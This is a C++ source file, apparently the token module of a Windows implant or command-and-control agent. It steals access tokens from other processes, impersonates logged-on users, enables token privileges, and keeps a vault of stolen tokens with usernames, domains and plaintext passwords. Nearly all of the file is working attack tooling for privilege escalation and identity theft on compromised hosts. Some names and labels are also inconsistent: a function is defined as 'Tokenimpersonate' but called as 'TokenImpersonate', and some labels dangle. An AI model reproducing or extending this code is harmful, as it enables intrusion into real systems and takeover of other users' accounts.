#include "core/include/tokens.hpp"
namespace Token {

	BOOL RevertToken() {
		HEXANE

		HANDLE token = { };
		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &token, sizeof(HANDLE)))) {
			return TRUE;
		}

		return FALSE;
	}

	BOOL Tokenimpersonate(bool impersonate) {
		HEXANE

		BOOL success = FALSE;
		if (impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
			if (!(Ctx->Tokens.Impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->Tokens.Token->Handle))) {
				return_defer(ERROR_CANNOT_IMPERSONATE);
			}
		} else if (!impersonate && Ctx->Tokens.Impersonate) {
			Ctx->Tokens.Impersonate = FALSE;
			success = RevertToken();

		} else if (impersonate && !Ctx->Tokens.Token) {
			success = TRUE;
		} else if (impersonate && Ctx->Tokens.Impersonate) {
			success = TRUE;
		} else if (impersonate && !Ctx->Tokens.Impersonate) {
			success = TRUE;
		}

		defer:
		return success;
	}

	VOID DuplicateToken(HANDLE orgToken, const uint32_t access, SECURITY_IMPERSONATION_LEVEL level, TOKEN_TYPE type, PHANDLE new_token) {
		HEXANE

		OBJECT_ATTRIBUTES attrs				= { };
		SECURITY_QUALITY_OF_SERVICE sqos	= { };

		sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
		sqos.ImpersonationLevel     = level;
		sqos.ContextTrackingMode	= 0;
		sqos.EffectiveOnly			= FALSE;

		InitializeObjectAttributes(&attrs, nullptr, 0, nullptr, nullptr);
		attrs.SecurityQualityOfService = &sqos;

		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, access, &attrs, FALSE, type, new_token);
	}

	VOID SetTokenPrivilege(const wchar_t* privilege, bool enable) {
		HEXANE

		TOKEN_PRIVILEGES token_priv	= { };
		HANDLE token 				= { };
		LUID luid 					= { };

		if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
			return_defer(ERROR_PRIVILEGE_NOT_HELD);
		}

		token_priv.PrivilegeCount		= 1;
		token_priv.Privileges[0].Luid	= luid;

		enable
		? token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
		: token_priv.Privileges[0].Attributes = NULL;

		if (
			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &token)) ||
			!Ctx->win32.AdjustTokenPrivileges(token, FALSE, &token_priv, 0, nullptr, nullptr)) {
			return_defer(ERROR_INVALID_TOKEN);
		}

		defer:
	}

	HANDLE StealProcessToken(HANDLE target, const uint32_t pid) {
		HEXANE

		HANDLE hProcess		= { };
		HANDLE hDuplicate	= { };

		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, pid))) {
			return_defer(ntstatus);
		}

		if (target) {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, target, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
				return_defer(ntstatus);
			}
		} else {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
				return_defer(ntstatus);
			}
		}

		defer:
		if (hProcess) {
			Ctx->Nt.NtClose(hProcess);
		}

		return hDuplicate;
	}

	_token_list_data* GetToken(const uint32_t tokenId) {
		HEXANE

		_token_list_data *head = Ctx->Tokens.Vault;
		uint32_t index = 0;

		for ( ;index < tokenId && head && head->Next; ++index) {
			head = head->Next;
		}
		if (index != tokenId) {
			return nullptr;
		}

		return head;
	}

	DWORD AddToken(HANDLE token, wchar_t* const username, const int16_t type, const uint32_t pid, wchar_t* const domain_user, wchar_t* const domain, wchar_t* const password) {
		HEXANE

		_token_list_data *head	= { };
		_token_list_data *entry	= { };
		DWORD Index				= 0;

		entry = R_CAST(_token_list_data*, x_malloc(sizeof(_token_list_data)));

		entry->Handle		= token;
		entry->lpUser		= username;
		entry->dwProcessID	= pid;
		entry->Type			= type;
		entry->DomainUser	= domain_user;
		entry->lpDomain		= domain;
		entry->lpPassword	= password;
		entry->Next			= nullptr;

		if (Ctx->Tokens.Vault == nullptr) {
			Ctx->Tokens.Vault = entry;
			return Index;
		}

		head = Ctx->Tokens.Vault;
		while (head->Next) {
			head = head->Next;
			Index++;
		}

		head->Next = entry;
		Index++;

		return Index;
	}

	BOOL RemoveToken(const uint32_t token_id) {
		HEXANE

		_token_list_data *head	= Ctx->Tokens.Vault;
		_token_list_data *entry	= GetToken(token_id);
		_token_list_data *prev	= { };

		if (!entry) {
			return FALSE;
		}

		while (head) {
			if (head == entry) {
				if (head == Ctx->Tokens.Vault) {
					Ctx->Tokens.Vault = entry->Next;

				} else {
					prev = Ctx->Tokens.Vault;
					while (prev && prev->Next != entry) {
						prev = prev->Next;
					}
					if (prev) {
						prev->Next = entry->Next;
					}
				}

				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == entry->Handle) {
					TokenImpersonate(FALSE);
				}

				if (entry->Handle) {
					Ctx->Nt.NtClose(entry->Handle);
					entry->Handle = nullptr;
				}

				if (entry->DomainUser) {
					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(wchar_t));
					x_free(entry->DomainUser);
					entry->DomainUser = nullptr;
				}

				if (entry->lpUser) {
					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(wchar_t));
					x_free(entry->lpUser);
					entry->lpUser = nullptr;
				}

				if (entry->lpDomain) {
					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(wchar_t));
					x_free(entry->lpDomain);
					entry->lpDomain = nullptr;
				}

				if (entry->lpPassword) {
					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(wchar_t));
					x_free(entry->lpPassword);
					entry->lpPassword = nullptr;
				}

				x_memset(entry, 0, sizeof(_token_list_data));

				x_free(entry);
				return TRUE;
			}

			head = head->Next;
		}

		return FALSE;
	}
}
